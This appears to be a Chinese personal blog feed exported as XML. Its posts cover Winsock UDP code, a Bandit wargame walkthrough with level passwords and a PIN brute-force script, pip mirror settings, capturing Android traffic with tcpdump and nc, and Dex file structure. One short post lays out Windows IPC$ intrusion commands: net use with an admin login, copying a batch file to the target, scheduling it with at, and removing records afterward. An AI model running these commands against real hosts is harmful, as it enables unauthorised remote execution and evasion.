!= 0) &#123; return 0; &#125; SOCKET sclient = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP); struct sockaddr_in sin; sin.sin_family = AF_INET; sin.sin_port = htons(8000); sin.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;); int len = sizeof(sin); char * sendData = &quot;Hello, my friend\n&quot;; sendto(sclient, sendData, strlen(sendData), 0, (SOCKADDR*)&amp;sin, len); char recvData[255]; int ret = recvfrom(sclient, recvData, 255, 0, (SOCKADDR*)&amp;sin, &amp;len); if (ret &gt; 0) &#123; recvData[ret] = 0x00; printf(recvData); &#125; closesocket(sclient); WSACleanup(); return 0;&#125; 编译 12gcc server_udp.c -o server_udp -lwsock32gcc client_udp.c -o client_udp -lwsock32 总结对于TCP版本的程序来说1server 端：创建WSAStartup -》检测!=0 -》创建socket -》检测SOCKET_ERROR -》声明sockaddr_in结构 -》bind -》检测SOCKET_ERROR -》listen -》检测SOCKET_ERROR -》进入循环 -》accept -》检测SOCKET_ERROR -》接收、发送消息 1client 端：创建WSAStartup -》检测!=0 -》创建socket -》检测SOCKET_ERROR -》声明sockaddr_in结构 -》connect -》检测SOCKET_ERROR -》发送、接收消息 对于UDP版本的程序来说1server 端：创建WSAStartup -》检测!=0 -》创建socket -》检测SOCKET_ERROR -》声明sockaddr_in结构 -》bind -》检测SOCKET_ERROR -》进入循环 -》发送、接收消息 1client 端：创建WSAStartup -》检测!=0 -》创建socket -》检测SOCKET_ERROR -》声明sockaddr_in结构 -》发送、接收消息 TCP中，使用send和recv函数进行发送和接收消息UDP中，使用sendto和recvfrom函数进行发送和接收消息]]></content>
      <categories>
        <category>Windows编程</category>
      </categories>
      <tags>
        <tag>Windows编程</tag>
        <tag>SOCKET编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WarGame之bandit通关日志]]></title>
    <url>%2F2018%2F09%2F07%2FWarGame%E4%B9%8Bbandit%E9%80%9A%E5%85%B3%E6%97%A5%E5%BF%97%2F</url>
    <content type="text"><![CDATA[BreifBandit是一个学习linux命令的WarGame，通过闯关的模式，不断的学习新的命令，对于程序员亦或者安全爱好者来说都是一个不错的学习平台，网址是 http://overthewire.org/wargames/bandit/ 分享给大家～ Level 0 → Level 1 Level Goal The goal of this level is for you to log into the game using SSH. The host to which you need to connect is bandit.labs.overthewire.org, on port 2220. The username is bandit0 and the password is bandit0. Once logged in, go to the Level 1 page to find out how to beat Level 1. The password for the next level is stored in a file called readme located in the home directory. Use this password to log into bandit1 using SSH. Whenever you find a password for a level, use SSH (on port 2220) to log into that level and continue the game.第一关直接ssh登陆就好了12ssh bandit0@bandit.labs.overthewire.org -p 2220密码：bandit0 直接查看readme得到密码boJ9jbbUNNfktd78OOpsqOltutMc3MY1 Level 1 → Level 2 Level GoalThe password for the next level is stored in a file called - located in the home directory 利用上一关得到的密码ssh登陆1ssh bandit1@bandit.labs.overthewire.org -p 2220 ls发现文件名是一个-，但是这个在linux中有特殊意义导致直接cat不好用因此可以使用./来注明是当前路径下的，就可以读取到了1cat ./- 密码是CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9 Level 2 → Level 3 Level GoalThe password for the next level is stored in a file called spaces in this filename located in the home directory这道题文件名中有空格，可以用双引号把文件名包裹起来1cat &quot;spaces in this filename&quot; 密码UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK Level 3 → Level 4 Level GoalThe password for the next level is stored in a hidden file in the inhere directory. 如题，文件是隐藏文件，在linux中，文件名前面有.的就是隐藏文件，可以使用ls -a来显示密码pIwrPrtPN36QITSp3EQaw936yaFoFgAB Level 4 → Level 5 Level GoalThe password for the next level is stored in the only human-readable file in the inhere directory. Tip: if your terminal is messed up, try the “reset” command. 本题有10个文件，题目说是密码在人类可读的文件，那么就要判断文件的类型，用file命令1file ./* 只有一个是ACSII TEXT类型的，那么就是目标了密码koReBOKuIDDepwhWk7jZC0RTdopnAYKh Level 5 → Level 6 Level GoalThe password for the next level is stored in a file somewhere under the inhere directory and has all of the following properties: human-readable1033 bytes in sizenot executable 这道题又是一个找文件的题目，ls -R目测有好几十个文件，一个个找肯定不现实，根据题目的要求，是一个人类可读文件，并且1033字节，非可执行文件，那么可以用find命令1find . -type f -size 1033c 解释一下-type f指定为普通文件，-size 1033c指定为1033字节，更多的用法如下123456789101112131415-size n[cwbkMG] : 档案大小 为 n 个由后缀决定的数据块。其中后缀含义为：b: 代表 512 位元组的区块（如果用户没有指定后缀，则默认为 b）c: 表示字节数k: 表示 kilo bytes （1024字节）w: 字 （2字节）M:兆字节（1048576字节）G: 千兆字节 （1073741824字节）-type c : 档案类型是 c 。d: 目录c: 字型装置档案b: 区块装置档案p: 具名贮列f: 一般档案l: 符号连结s: socket 最后找到了目标文件密码DXjZPULLxYr17uwoI01bNLQbtFemEgo7 Level 6 → Level 7 Level GoalThe password for the next level is stored somewhere on the server and has all of the following properties: owned by user bandit7owned by group bandit633 bytes in size 又是找文件，那么依然可以使用find命令，只不过参数稍稍的改变1find / -user bandit7 -group bandit6 -size 33c 2&gt;/dev/null 这里-user指定user组，-group指定group组，-size指定大小，后面的2&gt;/dev/null因为find命令在根目录下查找会经常有很多权限的报错信息，所有在linux中通常用这种方式将错误信息重定向到“黑洞中”密码HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs Level 7 → Level 8 Level GoalThe password for the next level is stored in the file data.txt next to the word millionth 题目说密码在单词millionth的后面，那么我们就在data.txt中搜索这个单词即可1cat data.txt|grep millionth 密码cvX2JJa4CFALtqS87jk27qwqGhBM9plV Level 8 → Level 9 Level GoalThe password for the next level is stored in the file data.txt and is the only line of text that occurs only once 这题是要找到出现一次的那个行，肯定用uniq命令了，但是使用之前需要用sort命令对文本进行排序，因为uniq命令是通过判断上下两行是否一样来判断的，所以用sort排序一下然后在uniq就能找到唯一出现的那一行了12sort data.txt|uniq -usort data.txt|uniq -c 这题我想了两种解法，一个是直接-u获取，还有就是-c列出出现的次数，然后从中找到是1的那一行即可密码UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR Level 9 → Level 10 Level GoalThe password for the next level is stored in the file data.txt in one of the few human-readable strings, beginning with several ‘=’ characters. 这题用cat命令之后会出现很多乱码，因此需要使用strings命令，获取可打印的字符1strings data.txt 密码truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk Level 10 → Level 11 Level GoalThe password for the next level is stored in the file data.txt, which contains base64 encoded data 查看文件发现是个base64的字符串，直接base64 -d解码即可密码IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR Level 11 → Level 12 Level GoalThe password for the next level is stored in the file data.txt, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions 根据题目所说的字母的的顺序旋转了13个位置，就相当去26个字母的前13个位置与后13个位置调换了。那么我们就是用tr命令进行调换1cat data.txt | tr &apos;a-zA-Z&apos; &apos;n-za-mN-ZA-M&apos; Level 12 → Level 13 Level GoalThe password for the next level is stored in the file data.txt, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under /tmp in which you can work using mkdir. For example: mkdir /tmp/myname123. Then copy the datafile using cp, and rename it using mv (read the manpages!) 这道题比较麻烦。首先我们按照提示，在/tmp目录下创建自定义的文件夹1234mkdir /tmp/pinocp data.txt /tmp/pinocd /tmp/pinocat data.txt 然后我们发现data.txt是一个hex dump文件，里面是十六进制的内容，我们可以用xxd命令将其转换成二进制文件1xxd -r data.txt &gt; data.bin 然后我们用file命令看一下这个二进制是什么文件发现是一个gzip压缩文件，那么利用mv命令把文件重命名1mv data.bin data.gz 然后用gzip -d命令解压，发现还是一个二进制文件，继续file命令查看发现是一个bzip2压缩文件，继续重命名并解压12mv data data.bz2bzip -d data.bz2 之后重复工作，后来还遇到了tar压缩文件12mv data data.tartar -xvf data.tar 如此解压，最后类似，得到密码8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL Level 13 → Level 14 Level GoalThe password for the next level is stored in /etc/bandit_pass/bandit14 and can only be read by user bandit14. For this level, you don’t get the next password, but you get a private SSH key that can be used to log into the next level. Note: localhost is a hostname that refers to the machine you are working on 这道题我们使用bandit13用户登陆的，但是题目说需要我们用bandit14用户登陆才能查看密码，并且给了我们ssh的私钥，那么我们就可以利用ssh -i参数指定私钥进行登陆1ssh -i sshkey.private bandit14@localhost 登陆之后1cat /etc/bandit_pass/bandit14 密码4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e Level 14 → Level 15 Level GoalThe password for the next level can be retrieved by submitting the password of the current level to port 30000 on localhost. 根据题目要求我们要把这关的密码提交到localhost的30000端口上，那么我就想到了用telnet连接到本地的30000端口上，然后把这关的密码发送过去密码BfMYroe26WYalil77FoDi9qh59eK5xNr Level 15 → Level 16 Level GoalThe password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL encryption. Helpful note: Getting “HEARTBEATING” and “Read R BLOCK”? Use -ign_eof and read the “CONNECTED COMMANDS” section in the manpage. Next to ‘R’ and ‘Q’, the ‘B’ command also works in this version of that command… 这道题用openssl命令这个命令不太常用，直接openssl help查看帮助，发现命令openssl s_client help根据帮助找到登陆命令1openssl s_client -connect localhost:30001 将本关的密码发送过去，发现看到了提示上面说的问题，根据提示带上参数-ign_eof再来一遍成功获取密码cluFn7wTiGryunymYOu4RcffSxQluehd Level 16 → Level 17 Level GoalThe credentials for the next level can be retrieved by submitting the password of the current level to a port on localhost in the range 31000 to 32000. First find out which of these ports have a server listening on them. Then find out which of those speak SSL and which don’t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it. 这道题做完之后感觉挺有意思的，首先看了一下题目要求，其实我是一脸懵逼的，本来想netstat看一下的，结果发现没权限。。。然后我就随手一发ps aux之后，发现有个nmap的进程，给了我灵感。。。1nmap localhost -p 31000-32000 有5个端口，但是题目说错误的端口是你发啥它回啥，于是测试了一下发现有两个端口可能是正确的，分别是31518和31790，题目又说了存在ssl服务，于是再挨个测试了一下12openssl s_client -connect localhost:31518openssl s_client -connect localhost:31790 发现31790是正确的 发现它返回了一个类似ssh私钥的文件，然后果断保存到一个文件中ssh.priv，这里需要在/tmp目录下创建一个自己的目录，才能写入到文件中，因为有权限管理。再利用上一关的知识1ssh -i /tmp/bandit16/ssh.priv bandit17@localhost 成功登陆，密码在/etc/bandit_pass/bandit17密码xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn Level 17 → Level 18 Level GoalThere are 2 files in the homedirectory: passwords.old and passwords.new. The password for the next level is in passwords.new and is the only line that has been changed between passwords.old and passwords.new NOTE: if you have solved this level and see ‘Byebye!’ when trying to log into bandit18, this is related to the next level, bandit19 这种比较新旧的问题肯定是用diff命令了1diff passwords.old passwords.new 密码kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd Level 18 → Level 19 Level GoalThe password for the next level is stored in a file readme in the homedirectory. Unfortunately, someone has modified .bashrc to log you out when you log in with SSH. 这道题我们正常登陆的话1ssh bandit18@bandit.labs.overthewire.org -p2220 然后我们就发现直接断开了 其实我们在ssh登陆的时候可以直接后面跟上命令，虽然被断开了，但是命令还是可以执行的，我们在后面加上cat readme，照常输入上一关的密码，下一关的密码就会显示出来的密码IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x Level 19 → Level 20 Level GoalTo gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (/etc/bandit_pass), after you have used the setuid binary. 这题也不知道要我们做什么，反正就莫名其妙的得到密码了密码GbKksEFF4yrVs6il55v6gwY5aVje5f0j Level 20 → Level 21 Level GoalThere is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21). NOTE: Try connecting to your own network daemon to see if it works as you think 题目说这个suconnect程序会连接到我们指定的端口，并且读取内容并于bandit20的密码进行比较，如果相同的话就返回下一关的密码我们知道密码是存放在/etc/bandit_pass/bandit20这个文件中的，因此我们就在本地开启一个端口，并且把密码发送到这个端口，然后我们在用这个程序连接到这个端口中就可以成功了。1nc -l 2333 &lt; /etc/bandit_pass/bandit20 &amp; 这里我在命令后面加了&amp;符号，可以让这条命令在后台执行，这样我们就可以继续执行./suconnect 2333命令来连接2333端口了获取密码gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr Level 21 → Level 22 Level GoalA program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed. 按照提示到/etc/cron.d目录下查看cronjob_bandit22的定时任务最后获取密码Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI Level 22 → Level 23 Level GoalA program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed. NOTE: Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints. 解题看下图 密码jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n Level 23 → Level 24 Level GoalA program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed. NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level! NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around… 这道题先看一下contab文件分析一下知道定时任务会执行/usr/bin/cronjob_bandit24.sh这个文件shell脚本的功能是执行/var/spool/bandit24中的所有文件，如果60秒内没有执行就删除所有文件.因此思路就是我们写一个查看密码的shell脚本放到这个目录下，让他以bandit24用户来执行就好了。1234mkdir /tmp/bandit23chmod 777 /tmp/bandit23cd /tmp/bandit23vim shell.sh shell.sh的内容如下12#!/bin/bashcat /etc/bandit_pass/bandit24 &gt;&gt; /tmp/bandit/pass 然后chmod 777 shell.sh，再然后将shell.sh复制到/var/spool/bandit24目录下，等待一些时间，就会发现/tmp/bandit23/目录下多了一个pass文件，内容就是密码密码UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ Level 24 → Level 25 Level GoalA daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing. 这道题目首先nc连接一下根据要求输入上一关的密码加空格加4位数字，果断报错了。。所以要写脚本进行爆破。我想到的是使用pwntools来进行爆破（CTF打多了…）脚本如下:12345678910111213from pwn import *r = remote(&apos;localhost&apos;, 30002)for i in range(0, 10): for j in range(0, 10): for k in range(0, 10): for p in range(0, 10): flag = str(i) + str(j) + str(k) + str(p) s = &quot;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ &quot;+ flag r.sendline(s) response = r.recvline() if &apos;Wrong!&apos; not in response: print &apos;Correct! &apos; + response 一个比较粗糙的爆破脚本就写好了，执行就好了密码uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG Level 25 → Level 26 Level GoalLogging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it. 这道题登陆上去后发现home目录下有一个ssh的私钥，果断ssh连接上去1ssh -i ssh.private bandit26@localhost 但是登陆之后直接就切断了根据提示，说用户bandit26用的shell有问题，这种情况我们可以查看/etc/passwd文件其最后一个文件是该用户登陆后执行的文件，其他用户都是/bin/bash等，但是这个用户是/usr/bin/showtext，查看一下这里export TERM=linux是设置终端类型是linux，然后more 了一下~/text.txt文件，之后直接exit 0退出了，所以我们ssh才连接不上去！但是这里看到more了就会想到其实more可以执行命令的，之前博客里写过，more跟less都是可以执行命令的，在出发more的状况下输入!command这种。但是我们直接ssh登陆的时候并没有出发more的效果，原因是因为终端太大了。。把终端缩小点即可。然后输入!/bin/sh，尝试进入命令行模式，不过失败了。。这里还有其他的用法，输入v，进入vim模式，其实vim模式也能执行命令，方法也是!command，但是这里也不行，因此再就是用vim特有的:e file，vim模式下的e命令可以导入文件到编辑器内，我们知道密码的所在，因此就可以用e命令来导入密码文件1:e /etc/bandit_pass/bandit26 密码5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z Level 26 → Level 27 Level GoalGood job getting a shell! Now hurry and grab the password for bandit27! 这一关使用密码ssh登陆之后也是直接断开了，所以跟上一关套路一样，进入more模式，利用vim模式执行命令，这次不能用e来读取文件了，因为权限不够。!command也不行，!sh也不行，后来查看资料发现vim还有一种需要先设置shell的目录才行123vim模式下:set shell=/bin/sh:sh 这样得到了一个shell,ls发现有一个程序，跟以前一样，直接读取密码文件即可密码3ba3118a22e93127a4ed485be72ef5ea Level 27 → Level 28 Level GoalThere is a git repository at ssh://bandit27-git@localhost/home/bandit27-git/repo. The password for the user bandit27-git is the same as for the user bandit27. Clone the repository and find the password for the next level. 解题如图密码0ef186ac70e04ea33b4c1853d2526fa2 Level 28 → Level 29 Level GoalThere is a git repository at ssh://bandit28-git@localhost/home/bandit28-git/repo. The password for the user bandit28-git is the same as for the user bandit28. Clone the repository and find the password for the next level. 跟上一关一样使用git clone把东西下载下来，然后有一个READ.ME，查看没什么发现随手一个git log，查看一下日志从上到下为由新到旧，我们发现最新一条日志写着fix info leak，修复信息泄露，那么我们就git show，默认是有git diff-tree --cc的格式，可以看到文本差异。获得密码bbc96594b4e001778eee9975372716b2 Level 29 → Level 30 Level GoalThere is a git repository at ssh://bandit29-git@localhost/home/bandit29-git/repo. The password for the user bandit29-git is the same as for the user bandit29. Clone the repository and find the password for the next level. 这道题还是老套路，git clone一下，然后git log、git show都试了一下，也没啥发现，然后git branch -a了一下，看到了有四个分支看到了有一个dev的分支，一般dev是development开发者的分支，就切换分支看下1git checkout remotes/origin/master 发现了一些了不起的东西，git show得到密码5b90576bedb2cc04c86a9e924ce42faf Level 30 → Level 31Level GoalThere is a git repository at ssh://bandit30-git@localhost/home/bandit30-git/repo. The password for the user bandit30-git is the same as for the user bandit30. Clone the repository and find the password for the next level. git show-ref可以现实本地存储库的所有可用的引用以及关联的提交ID这里有一个敏感的secret字眼，直接git show f17132340e8ee6c159e0a4a6bc6f80e1da3b1aea，得到密码47e603bb428404d265f59c42920d81e5 Level 31 → Level 32 Level GoalThere is a git repository at ssh://bandit31-git@localhost/home/bandit31-git/repo. The password for the user bandit31-git is the same as for the user bandit31. Clone the repository and find the password for the next level. 本题要求我们把key.txt文件push到远程服务器上。首先按照要求创建key.txt1echo &apos;May I come in ?&apos; &gt; key.txt 然后12git add -f key.txtgit commit 这里git commit会打开nano编辑器，具体如何操作自行百度之后git push即可得到密码56a9bf19c63d650ce78e6ec0354ee45e Level 32 → Level 33After all this git stuff its time for another esape. Good luck! 执行uppershell发现他会把输入的命令变成大写之后再执行，导致命令并不能正常执行。因此我们可以写一个名字为大写的shell文件TEST文件12#!/bin/bashbash 这样就能获取到bandit33的bash了密码c9c3199ddf4121b10cf581a98d51caee Level 33 → Level 34结束啦～～]]></content>
      <categories>
        <category>WarGame</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>WarGame</tag>
        <tag>Bandit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用IPC进行渗透]]></title>
    <url>%2F2018%2F08%2F23%2F%E5%88%A9%E7%94%A8IPC%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"><![CDATA[IPC什么是IPC？IPC（Internet Process Connect），直译过来就是网络进程连接，一般用来进行资源共享的。我们经常会说IPC空连接，就是连接的时候不用账户和密码，但是一般这种情况是没啥权限的，如果我们能有一个管理员的账户，那么就可以有管理员的权限来进行渗透了。 IPC入侵思路因为渗透的时候是需要灵活的技巧，因此这里只是记录一个渗透思路罢了。 IPC空连接1net use \\ip\ipc$ &quot;&quot; /user:&quot;&quot; 以某用户账户登陆1net use \\ip\ipc$ &quot;password&quot; /user:Administrator 之后，我们可以写一个批处理文件，里面包含这我们想执行的命令，然后copy到服务器上1copy 1.bat \\ip\c$ 这样，就会把它上传到c盘 之后我们可以利用windows的定时任务来执行这个文件首先我们看一下服务器上的时间1net time \\ip 之后利用at命令来设置定时任务1at \\ip 时间 文件名 渗透完毕后记得删掉记录1net use \\ip\ipc$ /del]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>渗透测试</tag>
        <tag>IPC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mac下更改pip2/pip3国内源]]></title>
    <url>%2F2018%2F08%2F13%2FMac%E4%B8%8B%E6%9B%B4%E6%94%B9pip2-pip3%E5%9B%BD%E5%86%85%E6%BA%90%2F</url>
    <content type="text"><![CDATA[在使用Python的时候，经常会用到pip来安装模块，但是默认的下载源实在是特别慢，经常install的时候还会因为速度的原因直接报错，因此我们可以选择将下载源更改为国内的，这样就可以提高我们的下载速度了。 国内的知名下载源1234阿里云 ：http://mirrors.aliyun.com/pypi/simple/中国科学技术大学：https://pypi.mirrors.ustc.edu.cn/simple/清华大学：https://pypi.tuna.tsinghua.edu.cn/simple/豆瓣：http://pypi.douban.com/simple/ Mac下启动终端，输入如下命令123cd ~mkdir .piptouch pip.conf 创建pip.conf文件 然后我们打开pip.conf文件，输入以下内容：1234[global]index-url = https://pypi.tuna.tsinghua.edu.cn/simple/[install]trusted-host=pypi.tuna.tsinghua.edu.cn 然后python2的用户直接pip install xxxx，python3的用户直接pip3 install xxxx，可以看到速度真的是特别的快。]]></content>
      <categories>
        <category>Mac OS</category>
      </categories>
      <tags>
        <tag>小贴士</tag>
        <tag>Mac Os</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[获取Android App的网络流量]]></title>
    <url>%2F2018%2F08%2F01%2F%E8%8E%B7%E5%8F%96Android-App%E7%9A%84%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%2F</url>
    <content type="text"><![CDATA[运行环境 手机端 Android版本的tcpdump 已经root好的手机一枚 Android版本的nc PC端 wireshark PC版本的nc 检测流量首先连接好我们的手机到PC端上1adb device 然后，将下载好的tcpdump上传到Android手机上12adb push tcpdump /data/local/tmpadb shell chmod 755 /data/local/tmp/tcpdump 然后执行su，将权限提升至root用户，运行tcpdump开始抓包1./tcpdump -w - | nc -l -p 31337 这里的-w选项是指定一个输出文件，-表示输出是写到终端屏幕上的合起来就是将tcpdump抓取到的流量输出的Android端的31337端口上 之后，另起一个终端12adb forward tcp:12345 tcp:31337nc 127.0.0.1 12345 | wireshark -k -S -i - 这里首先将PC端的12345端口和Android端的31337端口就可以相互通信了，然后nc连接到PC端本地的12345端口，将获得的流量（也就是tcpdump抓到的流量即手机app的Web流量）输出到wireshark中，从而实现wireshark抓到Android的流量了。]]></content>
      <categories>
        <category>移动安全</category>
      </categories>
      <tags>
        <tag>移动安全</tag>
        <tag>安卓</tag>
        <tag>网络流量</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Dex文件结构分析]]></title>
    <url>%2F2018%2F08%2F01%2FDex%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[构造Dex文件Dex文件就是Dalvik可执行文件，实际上它就是一个优化后的java字节码文件，因此构造这类文件需要先写个java文件Pino.java12345public class Pino &#123; public static void main(String args[]) &#123; System.out.println(&quot;Hello World&quot;); &#125;&#125; 然后编译1javac Pino.java 之后得到了Pino.class文件，之后我们用dx工具，该工具需要安装Android SDK才能有的工具1dex --dex --output=Pino.dex Pino.class 这样就得到了一个dex文件了，之后我们利用010editor工具来进行分析。 Dex文件整体结构 那我们从头开始分析 Dex文件分析首先，我们来看一下Dex文件头的结构体12345678910111213141516171819202122232425struct DexHeader &#123; u1 magic[8]; /* dex的魔数 */ u4 checksum; /* 校验和 */ u1 signature[kSHA1DigestLen]; /* SHA-1哈希值*/ u4 fileSize; /* dex文件的大小 */ u4 headerSize; /* dex文件头的大小 */ u4 endianTag; /* 字节序标记 */ u4 linkSize; /* 链接段大小 */ u4 linkOff; /* 链接段偏移 */ u4 mapOff; /* DexMapList的文件偏移 */ u4 stringIdsSize; /* DexStringId的个数 */ u4 stringIdsOff; /* DexStringId的偏移 */ u4 typeIdsSize; /* DexTypeId的个数 */ u4 typeIdsOff; /* DexTypeId的偏移 */ u4 protoIdsSize; /* DexProtoId的个数 */ u4 protoIdsOff; /* DexStringId的偏移 */ u4 fieldIdsSize; /* DexFieldId的个数 */ u4 fieldIdsOff; /* DexFieldId的偏移 */ u4 methodIdsSize; /* DexMethodId的个数 */ u4 methodIdsOff; /* DexMethodId的偏移 */ u4 classDefsSize; /* DexClassDef的个数 */ u4 classDefsOff; /* DexClassDef的偏移 */ u4 dataSize; /* 数据段的大小 */ u4 dataOff; /* 数据段的偏移 */&#125;; magic[8] 由8个u1类型的数据，内容是“64 65 78 0A 30 33 35 00”，u1就是1个字节的无符号数，这个是dex文件的标志，用来识别dex文件的。 checksum 没什么好说的，就是dex文件的校验和 signature[kSHA1DigestLen]，就是整个dex文件进行SHA-1哈希计算得到的字符串，一般来说20个字节 fileSize， 整个dex文件的大小 headerSize， dex文件的头的大小 endianTag， dex文件的字节序标记，用于指定dex文件运行环境的cpu，预设值为0x12345678，在010editor的话就是“78 56 34 12”（小端序） linkSize和linkOff， 链接段的大小和文件偏移，通常为0，linkSize为0表示静态链接 mapOff， DexMapList的文件偏移 stringIdsSize和stringIdsOff，这两个是DexStringId的个数和文件偏移 这里stringIdSize的值为0E，10进制就是14，也就是说这个dex文件的字符串的个数为14个，文件偏移是70，我们到70的位置看一下蓝色部分就是DexStringId的内容了，每个字符串4字节，总共14个，我们先看一下第一组“76 01 00 00”，这个值并不是字符串的具体内容，而是字符串所在位置的文件偏移，我们去看一下176h这个位置 蓝色部分我一共选中了8个字节，其中第一个字节06代表的是之后多少个字节属于字符串，也就是“3C 69 6E 69 74 3E”，而最后一个字节的00其实是字符串结尾的空字节，但是计数的时候并没有算上而已，总结一下这个dex文件中所有的字符串如下：序号|字符串-|-0|1|Hello World2|LPino;3|Ljava/io/PrintStream;4|Ljava/lang/Object;5|Ljava/lang/String;6|Ljava/lang/System;7|Pino.java8|V9|VL10|[Ljava/lang/String;11|main12|out13|println typeIdSize和typeIdOff，就是类的类型个数和文件偏移，可以根据之前字符串的进行类比typeIdSize的值为07，也就是说由7个类型，typeIdOff的值是A8h，我们到A8的位置看一下蓝色选中的部分都是类型，但是这个一种数据结构123struct DexTypeId &#123; u4 descriptorIdx; //指向DexStringId列表的索引&#125; 先看一下第一个4字节的值“02 00 00 00 ”，对照之前我们整理的字符串的表格，就是LPino；即Pino类型的，整理一下所有的类型，如下序号|类的类型-|-0|LPino;1|Ljava/io/PrintStream;2|Ljava/lang/Object;3|Ljava/lang/String;4|Ljava/lang/System;5|V6|[Ljava/lang/String; protoIdSize和protoIdOff，这两个是方法原型的个数和位置偏移 这里数量就是3，位置偏移为C4，跟过去看下 蓝色选中的部分就是所有的方法原型的结构了，这里又涉及到了一个新的数据结构12345struct DexProtoId &#123; u4 shortyIdx; //指向DexStringId列表的索引 u4 returntypeIdx; //指向DexTypeId列表的索引 u4 parameterOff; //指向DexTypeList列表的位置偏移&#125; 这三个属性分别是第一个是方法声明的字符串，第二个是方法的返回类型，第三个是方法的参数列表，其中DexTypeList是新的数据结构1234struct DexTypeList &#123; u4 size; //DexTypeItem的个数 DexTypeItem list[1];&#125; 123struct DexTypeItem &#123; u2 typeIdx; //指向DexTypeId列表的索引&#125; 回过头来看一下蓝色部分，12个字节，第一个4字节为8，说明DexStringId列表的索引是8，也就是V，第二个4字节是5，也就是V，最后一个是0，也就是没有参数，第一个方法就是void ()，整理一下其他的如下：序号|方法原型-|-0|void()1|void (java.lang.String)2|void (java.lang.String[]) fieldIdSize和fieldIdOff这两个是字段的数量和位置偏移这里字段数是1，位置偏移为E8，字段也有新的数据结构12345struct DexFieldId&#123; u2 classIdx; /*类的类型，指向DexTypeId列表的索引*/ u2 typeIdx; /*字段类型，指向DexTypeId列表的索引*/ u4 nameIdx; /*字段名，指向DexStringId列表的索引*/&#125; 也就是一个DexFieldId是8个字节classIdx的值是4，也就是Ljava/lang/System;，typeIdx的值是1，也就是Ljava/io/PrintStream;，nameIdx的值是C，也就是out，总结一下字段如下：序号|字段-|-0|java.io.PrintStream java.lang.System.out methodIdSize和methodIdOff这两个分别是方法的数量和位置偏移fieldIdSize的值是4，也就是有4个方法，fieldIdOff是F0，跟过去看下新的数据结构如下：12345struct DexMethodId&#123; u2 classIdx; /*类的类型，指向DexTypeId列表的索引*/ u2 protoIdx; /*声明类型，指向DexProtoId列表的索引*/ u4 nameIdx; /*方法名，指向DexStringId列表的索引*/&#125; 也就是说每个DexMethodId占8个字节，第一个8字节中的classIdx的值是0，也就是LPino;，protoIdx的值也是0，也就是void()，第三nameIdx也是0，也就是，综合起来就是void Pino.(),整理一下所有的方法如下：序号|方法-|-0|void Pino.()1|void Pino.main(java.lang.String[])2|void java.io.PrintStream.println(java.lang.String)3|void java.lang.Object.() classDefsSize和classDefsOff是类的定义的数量和位置偏移classDefsSize的值为1，说明就定义了一个类，然后在到110h的位置看看，但是这里还是有新的结构体12345678910struct DexClassDef&#123; u4 classIdx; /*类的类型，指向DexTypeId列表的索引*/ u4 accessFlags; /*访问标志，就是表示是public还是private等等*/ u4 superclassIdx; /*父类类型，指向DexTypeId列表的索引*/ u4 interfacesOff; /*接口，指向DexTypeList的偏移*/ u4 sourceFileIdx; /*源文件名，指向DexStringId列表的索引*/ u4 annotationsOff; /*注解，指向DexAnnotationsDirectoryItem结构*/ u4 classDataOff; /*指向DexClassData结构的偏移*/ u4 staticValuesOff; /*指向DexEncodedArray结构的偏移*/&#125; 